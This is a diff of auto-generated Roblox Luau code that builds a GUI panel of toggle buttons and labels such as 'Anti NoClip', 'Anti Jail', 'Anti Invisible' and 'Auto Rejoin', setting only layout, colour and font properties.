-G2L["1d6"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1d6"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame
-G2L["1d7"] = Instance.new("Frame", G2L["1d5"]);
-G2L["1d7"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1d7"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1d7"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1d7"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1d7"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.outlineStroke
-G2L["1d8"] = Instance.new("UIStroke", G2L["1d7"]);
-G2L["1d8"]["Thickness"] = 2;
-G2L["1d8"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade
-G2L["1d9"] = Instance.new("CanvasGroup", G2L["1d7"]);
-G2L["1d9"]["BorderSizePixel"] = 0;
-G2L["1d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1d9"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d9"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1d9"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade.UIGradient
-G2L["1da"] = Instance.new("UIGradient", G2L["1d9"]);
-G2L["1da"]["Rotation"] = 90;
-G2L["1da"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text
-G2L["1db"] = Instance.new("TextLabel", G2L["1d4"]);
-G2L["1db"]["TextWrapped"] = true;
-G2L["1db"]["BorderSizePixel"] = 0;
-G2L["1db"]["TextSize"] = 14;
-G2L["1db"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1db"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1db"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1db"]["BackgroundTransparency"] = 1;
-G2L["1db"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1db"]["Text"] = [[Anti Morph]];
-G2L["1db"]["Name"] = [[text]];
-G2L["1db"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.UIPadding
-G2L["1dc"] = Instance.new("UIPadding", G2L["1db"]);
-G2L["1dc"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.text
-G2L["1dd"] = Instance.new("UIStroke", G2L["1db"]);
-G2L["1dd"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.UIPadding
-G2L["1de"] = Instance.new("UIPadding", G2L["1d4"]);
-G2L["1de"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip
-G2L["1df"] = Instance.new("Frame", G2L["17e"]);
-G2L["1df"]["BorderSizePixel"] = 0;
-G2L["1df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1df"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1df"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1df"]["Name"] = [[noclip]];
-G2L["1df"]["LayoutOrder"] = 8;
-G2L["1df"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button
-G2L["1e0"] = Instance.new("TextButton", G2L["1df"]);
-G2L["1e0"]["BorderSizePixel"] = 0;
-G2L["1e0"]["TextTransparency"] = 1;
-G2L["1e0"]["TextSize"] = 14;
-G2L["1e0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1e0"]["BackgroundTransparency"] = 1;
-G2L["1e0"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e0"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.UIPadding
-G2L["1e1"] = Instance.new("UIPadding", G2L["1e0"]);
-G2L["1e1"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1e1"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1e1"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1e1"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame
-G2L["1e2"] = Instance.new("Frame", G2L["1e0"]);
-G2L["1e2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1e2"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1e2"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1e2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1e2"]["Name"] = [[toggleFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.outlineStroke
-G2L["1e3"] = Instance.new("UIStroke", G2L["1e2"]);
-G2L["1e3"]["Thickness"] = 2;
-G2L["1e3"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade
-G2L["1e4"] = Instance.new("CanvasGroup", G2L["1e2"]);
-G2L["1e4"]["BorderSizePixel"] = 0;
-G2L["1e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1e4"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e4"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e4"]["Name"] = [[toggleFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade.UIGradient
-G2L["1e5"] = Instance.new("UIGradient", G2L["1e4"]);
-G2L["1e5"]["Rotation"] = 90;
-G2L["1e5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text
-G2L["1e6"] = Instance.new("TextLabel", G2L["1df"]);
-G2L["1e6"]["TextWrapped"] = true;
-G2L["1e6"]["BorderSizePixel"] = 0;
-G2L["1e6"]["TextSize"] = 14;
-G2L["1e6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1e6"]["BackgroundTransparency"] = 1;
-G2L["1e6"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["1e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1e6"]["Text"] = [[Anti NoClip]];
-G2L["1e6"]["Name"] = [[text]];
-G2L["1e6"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.UIPadding
-G2L["1e7"] = Instance.new("UIPadding", G2L["1e6"]);
-G2L["1e7"]["PaddingLeft"] = UDim.new(0, 5);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.text
-G2L["1e8"] = Instance.new("UIStroke", G2L["1e6"]);
-G2L["1e8"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.UIPadding
-G2L["1e9"] = Instance.new("UIPadding", G2L["1df"]);
-G2L["1e9"]["PaddingLeft"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
-G2L["1ea"] = Instance.new("Frame", G2L["17e"]);
-G2L["1ea"]["BorderSizePixel"] = 0;
-G2L["1ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ea"]["Size"] = UDim2.new(1, 0, 0, 10);
-G2L["1ea"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ea"]["Name"] = [[---DIVIDER---]];
-G2L["1ea"]["LayoutOrder"] = 6;
-G2L["1ea"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
-G2L["1eb"] = Instance.new("Frame", G2L["1ea"]);
-G2L["1eb"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1eb"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1eb"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1eb"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1eb"]["Name"] = [[dividerFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
-G2L["1ec"] = Instance.new("UIStroke", G2L["1eb"]);
-G2L["1ec"]["Thickness"] = 2;
-G2L["1ec"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
-G2L["1ed"] = Instance.new("CanvasGroup", G2L["1eb"]);
-G2L["1ed"]["BorderSizePixel"] = 0;
-G2L["1ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ed"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ed"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ed"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
-G2L["1ee"] = Instance.new("UIGradient", G2L["1ed"]);
-G2L["1ee"]["Rotation"] = 90;
-G2L["1ee"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
-G2L["1ef"] = Instance.new("UIStroke", G2L["1eb"]);
-G2L["1ef"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["1ef"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
-G2L["1f0"] = Instance.new("UICorner", G2L["1eb"]);
-
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
-G2L["1f1"] = Instance.new("UIPadding", G2L["1ea"]);
-G2L["1f1"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1f1"]["PaddingRight"] = UDim.new(0, 6);
-G2L["1f1"]["PaddingLeft"] = UDim.new(0, 6);
-G2L["1f1"]["PaddingBottom"] = UDim.new(0, 3);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL
-G2L["1f2"] = Instance.new("Frame", G2L["17e"]);
-G2L["1f2"]["BorderSizePixel"] = 0;
-G2L["1f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f2"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1f2"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["1f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1f2"]["Name"] = [[autoresetLABEL]];
-G2L["1f2"]["LayoutOrder"] = 4;
-G2L["1f2"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text
-G2L["1f3"] = Instance.new("TextLabel", G2L["1f2"]);
+G2L["1f3"] = Instance.new("TextLabel", G2L["1ec"]);
 G2L["1f3"]["TextWrapped"] = true;
-G2L["1f3"]["ZIndex"] = 10;
 G2L["1f3"]["BorderSizePixel"] = 0;
 G2L["1f3"]["TextSize"] = 14;
 G2L["1f3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1f3"]["TextTransparency"] = 0.3;
 G2L["1f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["1f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1f3"]["BackgroundTransparency"] = 1;
-G2L["1f3"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1f3"]["Size"] = UDim2.new(0, 156, 0, 20);
 G2L["1f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1f3"]["Text"] = [[Auto Reset]];
+G2L["1f3"]["Text"] = [[Anti Freeze]];
 G2L["1f3"]["Name"] = [[text]];
+G2L["1f3"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.UIPadding
 G2L["1f4"] = Instance.new("UIPadding", G2L["1f3"]);
-G2L["1f4"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["1f4"]["PaddingLeft"] = UDim.new(0, 5);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.text
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.text.text
 G2L["1f5"] = Instance.new("UIStroke", G2L["1f3"]);
 G2L["1f5"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL
-G2L["1f6"] = Instance.new("Frame", G2L["17e"]);
-G2L["1f6"]["BorderSizePixel"] = 0;
-G2L["1f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f6"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1f6"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["1f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1f6"]["Name"] = [[autorejoinLABEL]];
-G2L["1f6"]["LayoutOrder"] = 6;
-G2L["1f6"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.freeze.UIPadding
+G2L["1f6"] = Instance.new("UIPadding", G2L["1ec"]);
+G2L["1f6"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text
-G2L["1f7"] = Instance.new("TextLabel", G2L["1f6"]);
-G2L["1f7"]["TextWrapped"] = true;
-G2L["1f7"]["ZIndex"] = 10;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible
+G2L["1f7"] = Instance.new("Frame", G2L["1ac"]);
 G2L["1f7"]["BorderSizePixel"] = 0;
-G2L["1f7"]["TextSize"] = 14;
-G2L["1f7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["1f7"]["TextTransparency"] = 0.3;
 G2L["1f7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1f7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1f7"]["BackgroundTransparency"] = 1;
-G2L["1f7"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1f7"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["1f7"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["1f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1f7"]["Text"] = [[Auto Rejoin]];
-G2L["1f7"]["Name"] = [[text]];
+G2L["1f7"]["Name"] = [[invisible]];
+G2L["1f7"]["LayoutOrder"] = 5;
+G2L["1f7"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.UIPadding
-G2L["1f8"] = Instance.new("UIPadding", G2L["1f7"]);
-G2L["1f8"]["PaddingLeft"] = UDim.new(0, 6);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button
+G2L["1f8"] = Instance.new("TextButton", G2L["1f7"]);
+G2L["1f8"]["BorderSizePixel"] = 0;
+G2L["1f8"]["TextTransparency"] = 1;
+G2L["1f8"]["TextSize"] = 14;
+G2L["1f8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f8"]["BackgroundTransparency"] = 1;
+G2L["1f8"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["1f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f8"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.text
-G2L["1f9"] = Instance.new("UIStroke", G2L["1f7"]);
-G2L["1f9"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.UIPadding
+G2L["1f9"] = Instance.new("UIPadding", G2L["1f8"]);
+G2L["1f9"]["PaddingTop"] = UDim.new(0, 3);
+G2L["1f9"]["PaddingRight"] = UDim.new(0, 3);
+G2L["1f9"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["1f9"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail
-G2L["1fa"] = Instance.new("Frame", G2L["17e"]);
-G2L["1fa"]["BorderSizePixel"] = 0;
-G2L["1fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1fa"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["1fa"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["1fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1fa"]["Name"] = [[jail]];
-G2L["1fa"]["LayoutOrder"] = 2;
-G2L["1fa"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame
+G2L["1fa"] = Instance.new("Frame", G2L["1f8"]);
+G2L["1fa"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["1fa"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["1fa"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1fa"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["1fa"]["Name"] = [[toggleFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button
-G2L["1fb"] = Instance.new("TextButton", G2L["1fa"]);
-G2L["1fb"]["BorderSizePixel"] = 0;
-G2L["1fb"]["TextTransparency"] = 1;
-G2L["1fb"]["TextSize"] = 14;
-G2L["1fb"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["1fb"]["BackgroundTransparency"] = 1;
-G2L["1fb"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["1fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1fb"]["Name"] = [[button]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.outlineStroke
+G2L["1fb"] = Instance.new("UIStroke", G2L["1fa"]);
+G2L["1fb"]["Thickness"] = 2;
+G2L["1fb"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.UIPadding
-G2L["1fc"] = Instance.new("UIPadding", G2L["1fb"]);
-G2L["1fc"]["PaddingTop"] = UDim.new(0, 3);
-G2L["1fc"]["PaddingRight"] = UDim.new(0, 3);
-G2L["1fc"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["1fc"]["PaddingBottom"] = UDim.new(0, 3);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade
+G2L["1fc"] = Instance.new("CanvasGroup", G2L["1fa"]);
+G2L["1fc"]["BorderSizePixel"] = 0;
+G2L["1fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fc"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fc"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["1fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fc"]["Name"] = [[toggleFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame
-G2L["1fd"] = Instance.new("Frame", G2L["1fb"]);
-G2L["1fd"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["1fd"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["1fd"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1fd"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["1fd"]["Name"] = [[toggleFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.button.toggleFrame.toggleFade.UIGradient
+G2L["1fd"] = Instance.new("UIGradient", G2L["1fc"]);
+G2L["1fd"]["Rotation"] = 90;
+G2L["1fd"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.outlineStroke
-G2L["1fe"] = Instance.new("UIStroke", G2L["1fd"]);
-G2L["1fe"]["Thickness"] = 2;
-G2L["1fe"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text
+G2L["1fe"] = Instance.new("TextLabel", G2L["1f7"]);
+G2L["1fe"]["TextWrapped"] = true;
+G2L["1fe"]["BorderSizePixel"] = 0;
+G2L["1fe"]["TextSize"] = 14;
+G2L["1fe"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1fe"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fe"]["BackgroundTransparency"] = 1;
+G2L["1fe"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["1fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fe"]["Text"] = [[Anti Invisible]];
+G2L["1fe"]["Name"] = [[text]];
+G2L["1fe"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade
-G2L["1ff"] = Instance.new("CanvasGroup", G2L["1fd"]);
-G2L["1ff"]["BorderSizePixel"] = 0;
-G2L["1ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["1ff"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ff"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["1ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["1ff"]["Name"] = [[toggleFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.UIPadding
+G2L["1ff"] = Instance.new("UIPadding", G2L["1fe"]);
+G2L["1ff"]["PaddingLeft"] = UDim.new(0, 5);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade.UIGradient
-G2L["200"] = Instance.new("UIGradient", G2L["1ff"]);
-G2L["200"]["Rotation"] = 90;
-G2L["200"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.text.text
+G2L["200"] = Instance.new("UIStroke", G2L["1fe"]);
+G2L["200"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text
-G2L["201"] = Instance.new("TextLabel", G2L["1fa"]);
-G2L["201"]["TextWrapped"] = true;
-G2L["201"]["BorderSizePixel"] = 0;
-G2L["201"]["TextSize"] = 14;
-G2L["201"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["201"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["201"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["201"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["201"]["BackgroundTransparency"] = 1;
-G2L["201"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["201"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["201"]["Text"] = [[Anti Jail]];
-G2L["201"]["Name"] = [[text]];
-G2L["201"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.invisible.UIPadding
+G2L["201"] = Instance.new("UIPadding", G2L["1f7"]);
+G2L["201"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.UIPadding
-G2L["202"] = Instance.new("UIPadding", G2L["201"]);
-G2L["202"]["PaddingLeft"] = UDim.new(0, 5);
